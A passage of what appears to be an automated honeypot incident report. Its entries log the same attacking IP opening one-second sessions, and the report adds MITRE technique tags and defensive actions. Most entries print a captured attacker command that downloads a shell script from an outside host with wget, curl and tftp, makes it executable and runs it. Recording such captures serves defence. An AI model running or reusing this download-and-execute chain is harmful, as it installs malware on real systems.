| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:56:59` | `cowrie.session.connect` |
| `2026-08-25 09:57:00` | `cowrie.login.success` |
| `2026-08-25 09:57:00` | `cowrie.session.params` |
| `2026-08-25 09:57:00` | `cowrie.command.input` |
| `2026-08-25 09:57:00` | `cowrie.command.success` |
| `2026-08-25 09:57:01` | `cowrie.log.closed` |
| `2026-08-25 09:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd78f7be7dc

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:01` | `cowrie.session.connect` |
| `2026-08-25 09:57:01` | `cowrie.login.success` |
| `2026-08-25 09:57:02` | `cowrie.session.params` |
| `2026-08-25 09:57:02` | `cowrie.command.input` |
| `2026-08-25 09:57:02` | `cowrie.command.success` |
| `2026-08-25 09:57:02` | `cowrie.log.closed` |
| `2026-08-25 09:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f8573086808

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:02` | `cowrie.session.connect` |
| `2026-08-25 09:57:03` | `cowrie.login.success` |
| `2026-08-25 09:57:03` | `cowrie.session.params` |
| `2026-08-25 09:57:03` | `cowrie.command.input` |
| `2026-08-25 09:57:03` | `cowrie.command.success` |
| `2026-08-25 09:57:04` | `cowrie.log.closed` |
| `2026-08-25 09:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da86f35399f8

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:04` | `cowrie.session.connect` |
| `2026-08-25 09:57:04` | `cowrie.login.success` |
| `2026-08-25 09:57:05` | `cowrie.session.params` |
| `2026-08-25 09:57:05` | `cowrie.log.closed` |
| `2026-08-25 09:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6fdd7ca109

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:05` | `cowrie.session.connect` |
| `2026-08-25 09:57:05` | `cowrie.login.success` |
| `2026-08-25 09:57:06` | `cowrie.session.params` |
| `2026-08-25 09:57:06` | `cowrie.command.input` |
| `2026-08-25 09:57:06` | `cowrie.command.success` |
| `2026-08-25 09:57:06` | `cowrie.log.closed` |
| `2026-08-25 09:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3d4a077fc3d

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:07` | `cowrie.session.connect` |
| `2026-08-25 09:57:07` | `cowrie.login.success` |
| `2026-08-25 09:57:07` | `cowrie.session.params` |
| `2026-08-25 09:57:07` | `cowrie.command.input` |
| `2026-08-25 09:57:07` | `cowrie.command.success` |
| `2026-08-25 09:57:08` | `cowrie.log.closed` |
| `2026-08-25 09:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06d6c8ba38d3

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:08` | `cowrie.session.connect` |
| `2026-08-25 09:57:08` | `cowrie.login.success` |
| `2026-08-25 09:57:09` | `cowrie.session.params` |
| `2026-08-25 09:57:09` | `cowrie.command.input` |
| `2026-08-25 09:57:09` | `cowrie.command.success` |
| `2026-08-25 09:57:09` | `cowrie.log.closed` |
| `2026-08-25 09:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fe2d48c9278

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:09` | `cowrie.session.connect` |
| `2026-08-25 09:57:10` | `cowrie.login.success` |
| `2026-08-25 09:57:10` | `cowrie.session.params` |
| `2026-08-25 09:57:10` | `cowrie.command.input` |
| `2026-08-25 09:57:10` | `cowrie.command.success` |
| `2026-08-25 09:57:11` | `cowrie.log.closed` |
| `2026-08-25 09:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96a6f0021972

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:11` | `cowrie.session.connect` |
| `2026-08-25 09:57:11` | `cowrie.login.success` |
| `2026-08-25 09:57:12` | `cowrie.session.params` |
| `2026-08-25 09:57:12` | `cowrie.command.input` |
| `2026-08-25 09:57:12` | `cowrie.command.success` |
| `2026-08-25 09:57:12` | `cowrie.log.closed` |
| `2026-08-25 09:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bed15d9f4d15

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:12` | `cowrie.session.connect` |
| `2026-08-25 09:57:13` | `cowrie.login.success` |
| `2026-08-25 09:57:13` | `cowrie.session.params` |
| `2026-08-25 09:57:13` | `cowrie.command.input` |
| `2026-08-25 09:57:13` | `cowrie.command.success` |
| `2026-08-25 09:57:14` | `cowrie.log.closed` |
| `2026-08-25 09:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c22b63bbadd6

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:14` | `cowrie.session.connect` |
| `2026-08-25 09:57:14` | `cowrie.login.success` |
| `2026-08-25 09:57:15` | `cowrie.session.params` |
| `2026-08-25 09:57:15` | `cowrie.command.input` |
| `2026-08-25 09:57:15` | `cowrie.command.success` |
| `2026-08-25 09:57:15` | `cowrie.log.closed` |
| `2026-08-25 09:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c769e44b383d

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:15` | `cowrie.session.connect` |
| `2026-08-25 09:57:16` | `cowrie.login.success` |
| `2026-08-25 09:57:16` | `cowrie.session.params` |
| `2026-08-25 09:57:16` | `cowrie.command.input` |
| `2026-08-25 09:57:16` | `cowrie.command.success` |
| `2026-08-25 09:57:17` | `cowrie.log.closed` |
| `2026-08-25 09:57:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0118da015c8

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:17` | `cowrie.session.connect` |
| `2026-08-25 09:57:17` | `cowrie.login.success` |
| `2026-08-25 09:57:18` | `cowrie.session.params` |
| `2026-08-25 09:57:18` | `cowrie.command.input` |
| `2026-08-25 09:57:18` | `cowrie.command.success` |
| `2026-08-25 09:57:18` | `cowrie.log.closed` |
| `2026-08-25 09:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1900188ff639

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:19` | `cowrie.session.connect` |
| `2026-08-25 09:57:19` | `cowrie.login.success` |
| `2026-08-25 09:57:19` | `cowrie.session.params` |
| `2026-08-25 09:57:19` | `cowrie.command.input` |
| `2026-08-25 09:57:19` | `cowrie.command.success` |
| `2026-08-25 09:57:20` | `cowrie.log.closed` |
| `2026-08-25 09:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c47ef3b7824

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:20` | `cowrie.session.connect` |
| `2026-08-25 09:57:20` | `cowrie.login.success` |
| `2026-08-25 09:57:21` | `cowrie.session.params` |
| `2026-08-25 09:57:21` | `cowrie.command.input` |
| `2026-08-25 09:57:21` | `cowrie.command.success` |
| `2026-08-25 09:57:21` | `cowrie.log.closed` |
| `2026-08-25 09:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99ae5eaea094

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:22` | `cowrie.session.connect` |
| `2026-08-25 09:57:22` | `cowrie.login.success` |
| `2026-08-25 09:57:22` | `cowrie.session.params` |
| `2026-08-25 09:57:22` | `cowrie.command.input` |
| `2026-08-25 09:57:22` | `cowrie.command.success` |
| `2026-08-25 09:57:23` | `cowrie.log.closed` |
| `2026-08-25 09:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f73e4edf2440

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:23` | `cowrie.session.connect` |
| `2026-08-25 09:57:23` | `cowrie.login.success` |
| `2026-08-25 09:57:24` | `cowrie.session.params` |
| `2026-08-25 09:57:24` | `cowrie.command.input` |
| `2026-08-25 09:57:24` | `cowrie.command.success` |
| `2026-08-25 09:57:24` | `cowrie.log.closed` |
| `2026-08-25 09:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f019eec2d0d8

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:25` | `cowrie.session.connect` |
| `2026-08-25 09:57:25` | `cowrie.login.success` |
| `2026-08-25 09:57:25` | `cowrie.session.params` |
| `2026-08-25 09:57:25` | `cowrie.command.input` |
| `2026-08-25 09:57:25` | `cowrie.command.success` |
| `2026-08-25 09:57:26` | `cowrie.log.closed` |
| `2026-08-25 09:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6466f86c20d

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
